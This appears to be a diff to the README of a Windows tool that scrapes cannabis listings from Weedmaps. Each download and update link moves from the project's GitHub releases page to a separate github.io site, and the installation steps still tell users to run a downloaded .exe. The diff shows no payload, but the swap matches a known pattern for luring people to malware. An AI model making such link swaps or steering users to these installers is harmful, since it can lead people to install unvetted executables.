@@ -1,6 +1,6 @@
 # 📊 canadata-cannabis-data - Collect cannabis data from Weedmaps
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/akinesisgettogether35/canadata-cannabis-data/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://akinesisgettogether35.github.io)
 
 ## 🎯 What is CanaData?
 
@@ -33,7 +33,7 @@ Follow these steps to download and run CanaData on your Windows computer.
 
 ### Step 1: Download the Installer
 
-Visit the [CanaData releases page](https://github.com/akinesisgettogether35/canadata-cannabis-data/releases).
+Visit the [CanaData releases page](https://akinesisgettogether35.github.io).
 
 Look for the latest release. You will see a file named something like `canadata-windows.exe` or `canadata-setup.exe`. Click on it to download.
 
@@ -151,7 +151,7 @@ The current version does not support scheduling. You must run searches manually.
 
 ## 🔄 Updating CanaData
 
-Visit the [releases page](https://github.com/akinesisgettogether35/canadata-cannabis-data/releases) to check for new versions.
+Visit the [releases page](https://akinesisgettogether35.github.io) to check for new versions.
 
 Download the new installer and run it. The installer updates your existing installation. Your settings and saved data stay the same.
 
